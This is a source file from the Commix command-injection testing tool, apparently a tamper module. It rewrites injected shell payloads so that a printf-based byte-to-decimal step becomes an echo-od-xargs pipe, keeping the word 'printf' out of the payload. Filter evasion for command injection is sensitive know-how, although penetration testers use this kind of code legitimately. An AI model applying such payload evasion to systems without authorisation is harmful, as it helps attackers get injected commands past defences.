#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
About: Replaces the printf-based ASCII to Decimal `printf '%d' "'$char"` with `echo -n $char | od -An -tuC | xargs`.
Notes: This tamper script works against target(s) with a POSIX shell.
       The two pipes are the one thing this rewrite cannot be written without: 'od' reads a byte
       from its standard input alone, and the only way to hand it one without a pipe is awk's
       'sprintf', which carries the very name this script exists to avoid. So it is written only
       where a pipe is the operator the payload is already proving - under anything else the pipes
       would be operators of this script's own, and the payload would stop being the one test it is.
       'od' counts a byte unsigned, which is what the reading it stands in for has to be brought
       back to, so the arithmetic around that reading goes with it.
"""

__tamper__ = "printf2echo"
__priority__ = settings.PRIORITY.ABOVE_NORMAL

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_eval_incompatible(__tamper__) or checks.tamper_dep_unix_only(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Say with 'echo' what the payload said with 'printf'.
def tamper(payload):
  # A target settled as Windows after this script was accepted: 'cmd.exe' has no 'od' to read with.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return payload
  # The byte is handed to 'od' down a pipe, so this is only writable where a pipe is what is proving.
  if checks.current_separator() not in ("|", "||"):
    return payload
  space = checks.current_whitespace()
  prefix, suffix = checks.byte_ordinal_bounds()
  # The reading is taken whole - from the text written around it rather than by looking for a
  # closing bracket, which the byte's own expression carries plenty of.
  while prefix in payload:
    opened = payload.index(prefix)
    closed = payload.find(suffix, opened + len(prefix))
    if closed < 0:
      break
    byte = payload[opened + len(prefix):closed]
    counted = (settings.CMD_SUB_PREFIX + "echo" + space + "-n" + space + "\"" + byte + "\"" + space +
               "|" + space + "od" + space + "-An" + space + "-tuC" + space + "|" + space + "xargs" +
               settings.CMD_SUB_SUFFIX)
    payload = payload[:opened] + counted + payload[closed + len(suffix):]
  return payload

# eof
